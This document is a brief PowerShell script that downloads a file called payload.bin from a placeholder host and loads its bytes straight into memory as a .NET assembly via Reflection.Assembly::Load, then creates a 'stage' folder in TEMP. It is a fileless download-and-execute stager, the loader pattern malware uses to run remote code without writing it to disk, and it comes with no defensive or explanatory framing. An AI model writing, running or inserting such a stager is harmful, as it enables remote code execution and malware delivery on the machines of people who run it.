
[CmdletBinding()]
param(
    [string]$TargetUrl = 'https://adatum.com/payload.bin'
)
$StageBytes = (New-Object System.Net.WebClient).DownloadData($TargetUrl)
[Reflection.Assembly]::Load($StageBytes)
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
